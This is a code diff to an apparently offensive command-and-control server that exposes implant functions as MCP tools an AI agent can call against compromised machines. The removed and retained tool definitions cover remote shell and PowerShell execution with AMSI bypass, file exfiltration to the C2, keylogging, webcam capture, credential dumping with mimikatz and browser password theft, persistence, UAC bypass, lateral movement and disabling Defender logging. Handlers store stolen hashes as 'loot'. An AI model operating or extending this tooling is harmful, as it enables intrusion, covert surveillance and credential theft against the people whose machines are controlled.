@@ -499,90 +499,18 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
           // === EXECUTION ===
           { name: 'shell', description: 'Execute shell command on remote client (cmd.exe on Windows, /bin/sh on Linux). If only one client connected, client_id is auto-selected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, cmd: { type: 'string', description: 'Command to execute' } }, required: ['cmd'] } },
           { name: 'powershell', description: 'Execute PowerShell command on Windows client. Auto-selects client if only one connected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, cmd: { type: 'string', description: 'PowerShell command' }, bypass_amsi: { type: 'boolean', description: 'Attempt AMSI bypass first' } }, required: ['cmd'] } },
-          { name: 'execute_assembly', description: 'Load and execute .NET assembly in memory. Auto-selects client if only one connected.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Target client (optional if only one connected)' }, assembly_b64: { type: 'string', description: 'Base64 encoded .NET assembly' }, args: { type: 'string', description: 'Arguments to pass' } }, required: ['assembly_b64'] } },
 
           // === RECONNAISSANCE (all auto-select client if only one connected) ===
           { name: 'sysinfo', description: 'Get system info (OS, hardware, domain). Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional - auto-selects if one client' } } } },
-          { name: 'netinfo', description: 'Get network config (IPs, routes, connections). Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
           { name: 'pslist', description: 'List running processes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'services', description: 'List Windows services. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, filter: { type: 'string', description: 'Filter by name' } } } },
-          { name: 'installed_software', description: 'List installed programs. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'scheduled_tasks', description: 'List scheduled tasks. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'startup_programs', description: 'List startup programs. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'domain_info', description: 'Get AD domain info. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'local_users', description: 'List local users/groups. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'shares', description: 'List network shares. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string', description: 'Remote host (optional)' } } } },
 
           // === FILE OPERATIONS (all auto-select client) ===
           { name: 'ls', description: 'List directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string', description: 'Directory path (default: current)' } } } },
           { name: 'cat', description: 'Read file contents. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
           { name: 'write', description: 'Write to file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, content: { type: 'string' } }, required: ['path', 'content'] } },
           { name: 'download', description: 'Download file from client to C2. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, remote_path: { type: 'string' }, local_path: { type: 'string', description: 'Save path on C2 (optional)' } }, required: ['remote_path'] } },
-          { name: 'upload', description: 'Upload file to client. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, local_path: { type: 'string', description: 'Path on C2' }, remote_path: { type: 'string' } }, required: ['local_path', 'remote_path'] } },
-          { name: 'rm', description: 'Delete file/directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, recursive: { type: 'boolean' } }, required: ['path'] } },
-          { name: 'mkdir', description: 'Create directory. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
-          { name: 'cp', description: 'Copy file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, src: { type: 'string' }, dst: { type: 'string' } }, required: ['src', 'dst'] } },
-          { name: 'mv', description: 'Move/rename file. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, src: { type: 'string' }, dst: { type: 'string' } }, required: ['src', 'dst'] } },
-          { name: 'search', description: 'Search files by pattern. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, pattern: { type: 'string', description: 'Pattern (e.g., *.docx, *password*)' }, recursive: { type: 'boolean' } }, required: ['pattern'] } },
-          { name: 'zip', description: 'Compress to zip. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, src: { type: 'string' }, dst: { type: 'string' } }, required: ['src', 'dst'] } },
-
-          // === SURVEILLANCE (all auto-select client) ===
           { name: 'screenshot', description: 'Take screenshot. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'webcam', description: 'Capture webcam photo. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'keylog_start', description: 'Start keylogger. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'keylog_dump', description: 'Get captured keystrokes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'keylog_stop', description: 'Stop keylogger. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'clipboard', description: 'Get clipboard contents. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-
-          // === CREDENTIAL ACCESS (all auto-select client) ===
-          { name: 'hashdump', description: 'Dump password hashes (requires admin). Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'mimikatz', description: 'Run Mimikatz command. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, cmd: { type: 'string', description: 'Mimikatz command (e.g., sekurlsa::logonpasswords)' } }, required: ['cmd'] } },
-          { name: 'browser_creds', description: 'Extract browser passwords. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, browser: { type: 'string', description: 'chrome, firefox, edge, or all' } } } },
-          { name: 'wifi_passwords', description: 'Get saved WiFi passwords. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'vault_creds', description: 'Get Windows Vault credentials. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-
-          // === PERSISTENCE (auto-select client) ===
-          { name: 'persist_registry', description: 'Registry run key persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' }, hive: { type: 'string', description: 'HKCU or HKLM' } }, required: ['name', 'command'] } },
-          { name: 'persist_schtask', description: 'Scheduled task persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' }, trigger: { type: 'string', description: 'onlogon, daily, hourly' } }, required: ['name', 'command'] } },
-          { name: 'persist_service', description: 'Install as Windows service. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, binary_path: { type: 'string' } }, required: ['name', 'binary_path'] } },
-          { name: 'persist_startup', description: 'Add to startup folder. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' } }, required: ['name', 'command'] } },
-          { name: 'persist_wmi', description: 'WMI event subscription persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, name: { type: 'string' }, command: { type: 'string' } }, required: ['name', 'command'] } },
-          { name: 'persist_list', description: 'List persistence mechanisms. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'persist_remove', description: 'Remove persistence. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, type: { type: 'string', description: 'registry, schtask, service, startup, wmi' }, name: { type: 'string' } }, required: ['type', 'name'] } },
-
-          // === PRIVILEGE ESCALATION (auto-select client) ===
-          { name: 'privesc_check', description: 'Check privesc vectors. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'getsystem', description: 'Get SYSTEM privileges. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, technique: { type: 'string', description: 'token, pipe, or auto' } } } },
-          { name: 'runas', description: 'Run as different user. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, user: { type: 'string' }, password: { type: 'string' }, domain: { type: 'string' }, cmd: { type: 'string' } }, required: ['user', 'password', 'cmd'] } },
-          { name: 'bypassuac', description: 'UAC bypass. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, technique: { type: 'string', description: 'fodhelper, eventvwr, sdclt, auto' } } } },
-
-          // === LATERAL MOVEMENT (auto-select client) ===
-          { name: 'portscan', description: 'Port scan target. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, ports: { type: 'string', description: 'Ports (e.g., 22,80,443 or 1-1000)' } }, required: ['target', 'ports'] } },
-          { name: 'netscan', description: 'Scan network for hosts. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, subnet: { type: 'string', description: 'e.g., 192.168.1.0/24' } }, required: ['subnet'] } },
-          { name: 'psexec', description: 'PsExec remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'cmd'] } },
-          { name: 'wmiexec', description: 'WMI remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'cmd'] } },
-          { name: 'winrm', description: 'WinRM remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'cmd'] } },
-          { name: 'ssh_exec', description: 'SSH remote execution. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, target: { type: 'string' }, user: { type: 'string' }, password: { type: 'string' }, key: { type: 'string' }, cmd: { type: 'string' } }, required: ['target', 'user', 'cmd'] } },
-
-          // === DEFENSE EVASION (auto-select client) ===
-          { name: 'amsi_bypass', description: 'Bypass AMSI. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'etw_patch', description: 'Patch ETW logging. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'defender_exclude', description: 'Add Defender exclusion. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' } }, required: ['path'] } },
-          { name: 'defender_status', description: 'Get Defender status. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'firewall_status', description: 'Get firewall status. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'firewall_rule', description: 'Manage firewall rule. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, action: { type: 'string', description: 'add or remove' }, name: { type: 'string' }, port: { type: 'number' }, protocol: { type: 'string' } }, required: ['action', 'name'] } },
-          { name: 'timestomp', description: 'Modify file timestamps. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, reference: { type: 'string', description: 'Reference file' } }, required: ['path'] } },
-
-          // === PROCESS OPERATIONS (auto-select client) ===
           { name: 'ps', description: 'List processes. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' } } } },
-          { name: 'kill', description: 'Kill process. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, pid: { type: 'number' }, name: { type: 'string' } } } },
-          { name: 'inject', description: 'Inject shellcode. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, pid: { type: 'number' }, shellcode_b64: { type: 'string' } }, required: ['pid', 'shellcode_b64'] } },
-          { name: 'spawn', description: 'Spawn process. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, args: { type: 'string' }, hidden: { type: 'boolean' } }, required: ['path'] } },
-
-          // === REGISTRY - Windows (auto-select client) ===
-          { name: 'reg_read', description: 'Read registry value. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, name: { type: 'string' } }, required: ['path'] } },
-          { name: 'reg_write', description: 'Write registry value. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, name: { type: 'string' }, value: { type: 'string' }, type: { type: 'string', description: 'REG_SZ, REG_DWORD' } }, required: ['path', 'name', 'value'] } },
-          { name: 'reg_delete', description: 'Delete registry key/value. Auto-selects client.', inputSchema: { type: 'object', properties: { client_id: { type: 'string', description: 'Optional' }, path: { type: 'string' }, name: { type: 'string' } }, required: ['path'] } },
 
           // === C2 SERVER TOOLS (run directly on VPS, no sandbox) ===
           { name: 'server_shell', description: 'Execute any shell command on C2 server (bash, no sandbox, full permissions). Use sudo for privileged ops.', inputSchema: { type: 'object', properties: { command: { type: 'string', description: 'Shell command to run' }, cwd: { type: 'string', description: 'Working directory' }, timeout: { type: 'number', description: 'Timeout in ms (default 120000)' } }, required: ['command'] } },
@@ -830,8 +758,6 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         const cmdResult = await sendCmd('clipboard', {});
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       }
-
-      // === CREDENTIAL ACCESS ===
       else if (name === 'hashdump') {
         const cmdResult = await sendCmd('hashdump', {}, 120000);
         if (cmdResult.success) saveLoot(`${args.client_id}_hashes_${Date.now()}.txt`, cmdResult.hashes || cmdResult);
@@ -853,8 +779,6 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         if (cmdResult.success) saveLoot(`${args.client_id}_vault_${Date.now()}.json`, cmdResult);
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       }
-
-      // === PERSISTENCE ===
       else if (name === 'persist_registry') {
         const cmdResult = await sendCmd('persist_registry', { name: args.name, command: args.command, hive: args.hive || 'HKCU' });
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
@@ -877,8 +801,6 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         const cmdResult = await sendCmd('persist_remove', { type: args.type, name: args.name });
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       }
-
-      // === PRIVILEGE ESCALATION ===
       else if (name === 'privesc_check') {
         const cmdResult = await sendCmd('privesc_check', {}, 120000);
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
@@ -892,8 +814,6 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         const cmdResult = await sendCmd('bypassuac', { technique: args.technique || 'auto' });
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       }
-
-      // === LATERAL MOVEMENT ===
       else if (name === 'portscan') {
         const cmdResult = await sendCmd('portscan', { target: args.target, ports: args.ports }, 300000);
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
@@ -913,8 +833,6 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         const cmdResult = await sendCmd('ssh_exec', { target: args.target, user: args.user, password: args.password, key: args.key, cmd: args.cmd }, 120000);
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       }
-
-      // === DEFENSE EVASION ===
       else if (name === 'amsi_bypass') {
         const cmdResult = await sendCmd('amsi_bypass', {});
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
@@ -937,8 +855,6 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         const cmdResult = await sendCmd('timestomp', { path: args.path, reference: args.reference });
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       }
-
-      // === PROCESS OPERATIONS ===
       else if (name === 'kill') {
         const cmdResult = await sendCmd('kill', { pid: args.pid, name: args.name });
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
@@ -949,8 +865,6 @@ app.post('/mcp/sse', apiKeyAuthMiddleware, async (req, res) => {
         const cmdResult = await sendCmd('spawn', { path: args.path, args: args.args, hidden: args.hidden });
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
       }
-
-      // === REGISTRY ===
       else if (name === 'reg_read') {
         const cmdResult = await sendCmd('reg_read', { path: args.path, name: args.name });
         result = { content: [{ type: 'text', text: JSON.stringify(cmdResult, null, 2) }] };
